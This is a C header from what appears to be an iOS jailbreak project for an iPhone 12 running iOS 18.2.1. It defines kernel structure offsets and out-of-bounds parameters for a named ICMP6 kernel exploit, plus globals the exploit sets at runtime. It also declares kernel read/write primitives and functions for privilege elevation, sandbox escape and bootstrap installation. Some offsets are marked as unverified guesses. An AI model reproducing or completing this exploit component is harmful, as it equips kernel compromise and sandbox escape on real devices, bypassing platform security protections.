#ifndef OFFSETS_H
#define OFFSETS_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <mach/mach.h>

// Target: iPhone 12 (iPhone13,2) — A14 Bionic (arm64e, T8101)
// iOS 18.2.1 (build 22C161) — xnu-11215.62.3/RELEASE_ARM64_T8101

// ===== Page size =====
#ifdef PAGE_SIZE
#undef PAGE_SIZE
#endif
#define PAGE_SIZE 0x4000ULL

// ===== DarkSword ICMP6 exploit offsets =====
// wh1te4ever / ClearSword (TheRealClarity) verified offsets for iOS 18.x:
//   inpcb_icmp6filt = 0x148, socket_so_count = 0x254 (iOS 18.0+)
// (the 0x138+0x18=0x150 / 0x228 values are for iOS <= 17.0)
#define OFFSET_PCB_SOCKET      0x40   // inpcb -> socket
#define OFFSET_SOCKET_SO_COUNT 0x254  // socket retain count (iOS 18.x)
#define OFFSET_ICMP6FILT       0x148  // inpcb icmp6_filter pointer (iOS 18.x)
#define OFFSET_SO_PROTO        0x18   // socket -> protosw
#define OFFSET_PR_INPUT        0x28   // protosw -> pr_input

// ICMP6 socket option
#define IPPROTO_ICMPV6  58
#define ICMP6_FILTER    18

// ===== Exploit parameters =====
#define OOB_PAGES_NUM  2
#define OOB_SIZE       0xf00
#define OOB_OFFSET     0x100

// ===== Kernel base (cached) =====
#define KERNEL_BASE_DEFAULT 0xfffffff007004000ULL

// ===== Proc/thread struct offsets (iOS 18.2.x / A14, wh1te4ever darksword-kexploit-fun) =====
// Chain: inpcb(0x40) -> socket -> so_background_thread -> thread -> t_tro -> thread_ro -> proc
#define OFFSET_SOCKET_BACKGROUND_THREAD 0x2b0  // socket->so_background_thread (18.0-18.7)
#define OFFSET_THREAD_T_TRO             0x380  // thread->t_tro (A13+/A14, iOS 18.1-18.3)
#define OFFSET_THREAD_RO_PROC           0x18   // thread_ro->tro_proc
#define OFFSET_THREAD_RO_TASK           0x28   // thread_ro->tro_task

#define OFFSET_P_PID       0x60   // proc->p_pid (18.0-18.7)
#define OFFSET_P_PROC_RO   0x18   // proc->p_proc_ro
#define OFFSET_PROC_RO_TASK    0x8   // proc_ro->pr_task
#define OFFSET_PROC_RO_UCRED   0x20  // proc_ro->p_ucred (18.0-18.3.x)

// ===== Task struct offsets =====
#define OFFSET_TASK_T_FLAGS  0x3DC  // fallback; auto-detected at runtime
#define TF_PLATFORM          0x400  // task is platform binary

// ===== Ucred struct offsets (BEST GUESS - VERIFY ON DEVICE) =====
#define OFFSET_CR_UID    0x18   // ucred->cr_uid
#define OFFSET_CR_RUID   0x1C   // ucred->cr_ruid
#define OFFSET_CR_SVUID  0x20   // ucred->cr_svuid
#define OFFSET_CR_LABEL  0x78   // ucred->cr_label (MAC label pointer)

// ===== MAC label offsets =====
#define OFFSET_LABEL_SANDBOX  0x10  // label slots[0] or slots[1]

// ===== Global variables (set by exploit at runtime) =====
extern uint64_t gOurProc;
extern uint64_t gKernelProc;
extern uint64_t gOurTask;
extern uint64_t gKernelTask;
extern uint64_t gIS_TABLE;
extern uint64_t gOurPmap;
extern uint64_t gKernelPmap;
extern uint64_t gKernelBase;
extern uint64_t gKernelSlide;

// ===== Kernel R/W primitives =====
uint64_t kread64(uint64_t addr);
uint32_t kread32(uint64_t addr);
uint16_t kread16(uint64_t addr);
uint8_t  kread8(uint64_t addr);
uint64_t kread_ptr(uint64_t addr);
void kread_buf(uint64_t addr, void *buf, size_t len);
void kwrite64(uint64_t addr, uint64_t val);
void kwrite32(uint64_t addr, uint32_t val);
void kwrite16(uint64_t addr, uint16_t val);
void kwrite8(uint64_t addr, uint8_t val);
void kwrite_buf(uint64_t addr, void *buf, size_t len);

// ===== Platformize / Sandbox escape =====
bool platformize_proc(void);
bool escape_sandbox(void);

// ===== Proc/Task helpers =====
uint64_t find_our_proc(void);
uint64_t get_task_from_proc(uint64_t proc);
uint64_t get_ucred_from_proc(uint64_t proc);

// ===== Bootstrap / Sileo =====
bool install_bootstrap(void);
bool install_sileo(void);
bool remount_private_preboot(void);
bool load_trust_cache(const char *path);

#endif
